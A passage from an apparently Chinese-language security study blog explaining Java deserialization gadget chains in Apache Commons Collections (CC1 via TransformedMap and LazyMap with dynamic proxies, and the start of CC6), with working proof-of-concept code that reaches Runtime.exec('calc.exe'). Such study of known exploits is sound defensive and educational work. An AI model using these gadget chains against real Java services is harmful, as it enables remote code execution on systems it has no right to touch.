<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还差执行获取到的getRuntime，下一个input是上一个执行接口，继续对照</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=getRuntime这个方法</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//cls = java.lang.Method（getRuntime方法是method类）</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes); <span class="comment">//在method类中找到invoke方法，method=invoke方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs); <span class="comment">//调用invoke方法，input=getRuntime这个方法，传入自定义的参数</span></span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。<br></font>首先this.iMethodName, this.iParamTypes是根据invoke接口而定的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span></span><br><span class="line"><span class="comment">//this.iMethodName=&quot;invoke&quot;</span></span><br><span class="line"><span class="comment">//this.iParamTypes=new Class[] &#123;Object.class, Object[].class &#125;</span></span><br><span class="line"><span class="comment">//外面class、Object封装是InvokerTransformer类的构造函数要求</span></span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">按照invoke中的input才是它要调用的环境的准则。<br></font>invoke方法.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)<font style="color:rgb(51, 51, 51);">，<br></font>而input=getRuntime方法，那么只要填入this.iArgs就好了</p><p><font style="color:rgb(51, 51, 51);">又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。<br></font>this.iArgs=null,new Object[0]</p><p>那么整合就如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">以上代码其实就是等同于<br></font>((Runtime)Runtime.class.getMethod(“getMethod”,null).invoke(null,null)).exec(“calc.exe”);</p><p>将修改后的代码重新运行看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取sun.reflect.annotation.AnnotationInvocationHandler类的Class对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>发现还是不能运行我们动态调试看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714492748596-0fb8e329-f004-47b3-a544-e3e35b9e90b8.png" alt=""></p><p>发现在这里为空所以不能进入if条件，也就无法调用setValue方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493360560-346d68a7-c71d-42f7-a64d-f836b8c231d1.png" alt=""></p><p>在这里我们发现他回去获取我们传入的注解类型并且获取注解里面方法的名字，然后通过判断我们传入的名字是否与注解里的名字是否一致，一致则不为空否则为空就不进入if条件。所以这里我们子啊put时将键的值改成注解类型里面的方法名即可：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493512596-ca057800-313a-4866-8652-f0625c253621.png" alt=""></p><p>可以看到Target的方法名时value所以改成value就可以了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493541211-ea1119a7-895d-48e2-8286-e78b5d30d5bb.png" alt=""></p><p>这样就可以执行了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493565966-39b0b375-5f9e-41e0-8db4-f32dfb878fd3.png" alt=""></p><h4 id="cc1TransformedMap调用链">cc1TransformedMap调用链</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714626920076-d1f2e785-11df-4e1c-8f38-31c0b67b6f00.png" alt=""></p><p>参考：<a href="https://xz.aliyun.com/">https://xz.aliyun.com/</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=82398f68c82cb90e0d9aa4fea90e36a0">https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=82398f68c82cb90e0d9aa4fea90e36a0</a></p><p><a href="https://blog.csdn.net/weixin_49047967/article/details/134763883">https://blog.csdn.net/weixin_49047967/article/details/134763883</a></p><h2 id="4-java-cc1链-LazyMap">4.java cc1链-LazyMap</h2><p>LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承了</p><p>AbstractMapDecorator。</p><p>TransformedMap的漏洞触发点：是在利用put方法写入元素的时候触发了transform方法从而触发了我们构造的恶意利用链</p><p>LazyMap触发点与TransformedMap有点差别我们还是向以前通过查找transfrom的调用方法来看看：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714554338581-4bcad701-9832-4724-b268-bc7bcadcb3f9.png" alt=""></p><p>发现LazyMap的get方法中factory对象调用了transform方法所以只要我们能够将factory的对象设为invokertransformer对象，当map.containskey(key) == false，就会调用factory.transform。就可以进行rce</p><p>所以查看一下LazyMap的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现是factory对象是可控的，不过这里是protected类型所以不能直接实例化，但是LazyMap中也有一个静态方法decorate可以实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在TransformedMap利用链完善这篇文章中我们有分析AnnotationInvocationHandler，在其readObject方法中通过调用setValue添加元素来触发transform。但是在readObject方法中没有直接调用到Map的get方法。不过ysoserial的作者找到了在该类的invoke方法中调用了get方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714554837323-4cf489a2-de94-4c92-8e3c-8e3fca36fd6c.png" alt=""></p><p>但是反序列化的时候应该如何触发该方法呢，我们想到了java的动态代理，这里参考<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631676669-3aecdb26-7ebe-4a78-83d3-1e71ac849c83.pdf">Java安全漫谈 - 11.反序列化篇(5).pdf</a><a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631676791-e9c42936-3bc0-4c29-b034-115f85120c57.pdf">Java安全漫谈 - 10.用TransformedMap编写真正的POC.pdf</a></p><p><a href="https://mp.weixin.qq.com/s/doU_WAxgCHpApPpogngVtg">https://mp.weixin.qq.com/s/doU_WAxgCHpApPpogngVtg</a>、p牛的文章解释为什么可以在反序列化的时候可以调用invoke方法</p><h3 id="Java对象代理">Java对象代理</h3><p>作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法 __call ，我们需 要用到 java.reflect.Proxy ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>Proxy.newProxyInstance 的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要 代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻 辑。 比如，我们写这样一个类ExampleInvocationHandler：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vulhub;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">ExampleInvocationHandler</span><span class="params">(Map map)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span>(method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook method: &quot;</span>+ method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> vulhub;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExampleInvocationHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line">        proxyMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String)proxyMap.get(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看执行结果，我们能发现我们明明传进Map是test值为xxx，但是我们获取到的结果却是hacked Object。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555123018-c1afff61-6e34-4b50-b9b3-44b2ec105dfc.png" alt=""></p><p>这里用自己的话解释这个动态代理的应用原理，就是说我们使用这个Proxy.newProxyInstance这个类去代理一个对象时，这个对象调用任意方法都会触发我们传入的InvocationHandler对象的invoke方法。</p><p>AnnotationInvocationHandler，这个类实际就是一个InvocationHandler，将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意的方法。就会自动调用到 AnnotationInvocationHandler#invoke 方法，进而触发我们的LazyMap#get。我们可以调试看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555448211-7a496371-98f0-4bbb-9127-807b894099ce.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555530093-2cf6708d-98cf-4b2e-a9e8-d19352f653ba.png" alt=""></p><p>在这里发现membervalues调用entyset方法时调用了invoke方法。</p><p>所以我们可以构造出LazyMap的利用链</p><p>首先使用LazyMap替换TransformedMap。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><font style="color:rgba(0, 0, 0, 0.9);">  </font>然后通过反射获取<p>sun.reflect.annotation.AnnotationInvocationHandler</p><p>这个内部类，然后进行对其进行Proxy。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是：</p><p>sun.reflect.annotation.AnnotationInvocationHandler#readObject，</p><p>所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><p>完整的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//lazymap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><h3 id="cc1-LazyMap调用链">cc1 LazyMap调用链<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714669450577-aff3a171-9f0e-43f0-9a76-c5966722e65b.png" alt=""></h3><h2 id="5-java-cc6链">5.java cc6链</h2><p>在ysoserial中，CommonsCollections6可以说是commons-collections这个库中相对⽐较通⽤的利⽤ 链，为了解决⾼版本Java的利⽤问题，我们先来看看这个利⽤链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6_test</span> &#123;</span><br><span class="line">    <span class="comment">//定义序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义反序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fake_transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span 